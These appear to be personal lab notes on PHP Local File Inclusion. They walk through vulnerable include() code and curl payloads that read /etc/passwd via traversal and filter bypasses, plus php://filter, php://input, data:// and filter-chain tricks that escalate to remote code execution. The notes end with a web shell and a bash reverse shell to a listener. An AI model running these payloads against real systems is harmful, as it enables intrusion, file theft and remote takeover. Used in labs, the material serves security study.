# Definition
Something to do!!
## Installing and Preparing labs
I use my own machine to understand the vulnerability.
```shell
sudo service apache2 start
cd /var/www/html
touch index.php
```
# Familiarizing
## Understanding
First, let's see how this vulnerability works.
When you include a file inside *php* code like this.
```php
<?php
	$filename = $_GET['filename'];
	include($filename);
?>
```
___
The attacker will simply can see sensitive files, just like this.
```shell
curl -s -X GET "http://localhost/index.php?filename=/etc/passwd"
```
___
## Trying Securing Inclusions
You could think doing more secure your *php* script by forcing your web path concatenation.
```php
<?php
	$filename = $_GET['filename'];
	include("/var/www/html/" . $filename);
?>
```
But, the attacker could easily use a **Directory Traversal** and see anything.
```shell
curl -s -X GET "http://localhost/index.php/?filename=../../../../../../../..//etc/passwd"
```
___
Making more secure you could replace each **../** by nothing.
```php
<?php
	$filename = $_GET['filename'];
	$filename = str_replace("../", "", $filename);
	include("/var/www/html/" . $filename);
?>
```
But, the attacker could easily use  **....//** and see anything.
```shell
sudo curl -s -X GET "http://localhost/index.php/?filename=....//...//....//....//....//....//....//....///etc/passwd"
```
___
Now, you could use *regular expressions* to improve inclusion security by evading including a specific path */etc/passwd*.
```php
<?php
	$filename = $_GET['filename'];
	$filename = str_replace("../", "", $filename);

	if (preg_match("/\/etc\/passwd/", $filename) === 1) {
		echo "\n[!] Unable to view file content\n";
	} else {
		include("/var/www/html/" . $filename);
	}
?>
```
But, the attacker could use these syntaxes:
```shell
sudo curl -s -X GET "http://localhost/index.php/?filename=....//...//....//....//....//....//....//....///etc/////////passwd"
sudo curl -s -X GET "http://localhost/index.php/?filename=....//...//....//....//....//....//....//....///etc/./././//./././//passwd"
```
___
Another way to improve the security is by adding forcing file extension.
```php
<?php
	$filename = $_GET['filename'];
	$filename = str_replace("../", "", $filename);

	include("/var/www/html/" . $filename . ".php");
?>
```
The attacker leveraging lower PHP versions like 5.2, he cans use **Null Byte Technique**.
```shell
docker pull tommylau/php-5.2
docker run -dit --name lfiTesting <image_ID>
docker exec -it lfiTesting bash
```
![[Pasted image 20230712161030.png]]
![[Pasted image 20230712161243.png]]
___
Another  vulnerability of PHP 5.2 version is concatenating **/.**.
The developer could force file extension by validating the last characters.
![[Pasted image 20230712162803.png]]
___
# Attacking
Let's improve the difficulty of this vulnerability.
First, we use a docker machine to achieve this.
```shell
git clone https://github.com/NetsecExplained/docker-labs
cd docker-labs/file-inclusion/college_website
docker-compose up -d
```
___
## Docker Lab
We have a *college_website* at http://localhost:8081.
 ![[Pasted image 20230712164459.png]]
___
You can see the website.
![[Pasted image 20230712164633.png]]
___
Now, to practice *wrappers* you sould modify *index.php* file from docker process by changing this line.
```php
include $page.'.php';
```
by this.
```php
include $page;
```
___
## Simply PHP Wrapper
Let's start with *php base64 encoder* wrapper to view *.php* files in raw.
```txt
# Wrapper
php://filter/convert.base64-encode/resource=<PHP_FILE>
```
___
![[Pasted image 20230712170737.png]]
___
And the base64 string decoded show us database connection php file -> **admin/db_connect.php**.
![[Pasted image 20230712171129.png]]
___
Let's see that file using the same *wrapper* and decoding it.
![[Pasted image 20230712171619.png]]
___
## PHP Enconding Wrappers
Let's see another wrappers.
First, we are going to create a Docker image of **Ubuntu:latest**.
```shell
docker pull ubuntu:latest
docker run -dit -p 80:80 --name lfiTesting <image_ID>
docker exec -it lfiTesting bash
```
___
We are going to install *vim*, *apache2* and *php* inside the container and then start *apache* service.
```shell
apt update
apt install vim apache2 php
service apache2 start
```
___
We will remove *index.html* and create *index.php* from **/var/www/html**. Also, we will create a secret file *secret.php* that contains sensitive content.
*index.php*
```php
<?php
	$filename = $_GET['filename'];
	include($filename);
?>
```
*secret.php*
```php
<?php
	// You shouldn't see this content >:C
?>
```
___
- You can use the wrapper: **php://filter/read=string.rot13/resource=FILE**.
	![[Pasted image 20230712174244.png]]
	And you can decode *Caesar cipher* by executing this shell code.
	```shell
	curl -s -X GET "http://localhost/index.php?filename=php://filter/read=string.rot13/resource=secret.php" | tr '[c-za-bC-ZA-B]' '[p-za-oP-ZA-O]' 
	```
	![[Pasted image 20230712174833.png]]
___
- Another way to see *php* raw code without seeing *rotations* is by using **iconv convertion**, where the wrapper is: **php://filter/convert.iconv.utf-8.utf-16/resource=FILE**.
	```shell
	curl -X GET "http://localhost/index.php?filename=php://filter/convert.iconv.utf-8.utf-16/resource=secret.php" > curl_output 
	```
	And see the content.
	![[Pasted image 20230712175634.png]]
___
## LFI to RCE
Let's use [[BurpSuite]] and we are going to intercept *filename* request.
![[Pasted image 20230712180107.png]]
___
- We could use the **POST** wrapper: **php://input** achieve do a *Remote Code Execution*.
	First, we must enable *allow_url_encode* at **/etc/php/8.1/apache2/php.ini** and restart *apache2* service.
	Now, we can do a RCE.
	![[Pasted image 20230712181515.png]]
___
- Another way to perfom a **RCE** is with this wrapper: **data://text/plain;base64,<BASE64_STRING>**.
	First, we have to convert to base64 the malicious code.
	```shell
	echo -n '<?php system("id"); ?>' | base64
	```
	Then, we have to use this base64 string in BurpSuite.
	![[Pasted image 20230712183026.png]]
___
### Deconding and Encoding to do RCE
So far we have been using a bit of simply wrappers to do RCEs. But now, we are going to use *Decoding/Encoding* technique as long as the web site interprets *.php* file.
#### Why to Get Rid of Any Equal Signs
When we code a string with *base64* sometimes this adds **=** signs and it could lead to an error. For instance, we have coded *cxnsxle* string with *base64* and we add some **=** signs on it; when we decode this final string it can lead to an error.
![[Pasted image 20230712202121.png]]
___
To solve this *ERROR* we must use this convertion: **convert.iconv.UTF8.UTF7** before decoding.
![[Pasted image 20230712202313.png]]
___
#### Get Rid of Everything Invalid Base64
In the same way that *equal* signs. Let's use *decode-encode* convertion to avoid any invalid base64 by using: **convert.base64-decode|convert.base64-encode**.
![[Pasted image 20230712203138.png]]
___
#### Generate Some Garbage Base64
We should add some garbage to have space to generate specific characters. This is achieved by adding: **convert.iconv.UTF8.CSISO2022KR**.
![[Pasted image 20230712204332.png]]
___
#### Leveraging of Temp PHP Wrapper
You can think that PHP interprets the final conversion, and let me say you that YES!.
And better still, you don't need figure out an valid .php file, because you can use another wrapper: **php://temp** that works without needing a specific name.
![[Pasted image 20230712205114.png]]
___
#### Injecting PHP Code
You can see that above conversion *UTF8.CSISO2022KR* adds some characters to the dynamic *php://temp* file. So, you can add characters ony by one to generate this PHP code.
```php
<?php system("id"); ?>
```
___
So, you can use this [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py) tool to perfom this automatically.
![[Pasted image 20230712210334.png]]
___
And we could use this big string to do a RCE from *Docker* machine a bit of more complex :D.
![[Pasted image 20230712210744.png]]
___
Also, you can generate a template to do RCE by using *GET* method with this PHP code.
```php
<?php system($_GET["cmd"]); ?>
```
___
![[Pasted image 20230712211042.png]]
___
Finally adding at the end of the URL request this: **&cmd=<_COMMAND_>**.
We start *netcat* listener from the attacker.
```shell
sudo nc -nlvp 4646
```
___
And the **<_COMMAND_>** is.
```URL
bash -c "bash -i >%26 /dev/tcp/172.17.0.1/4646 0>%261"
```
___
Stablish the *netcat* connection.
![[Pasted image 20230712213026.png]]
___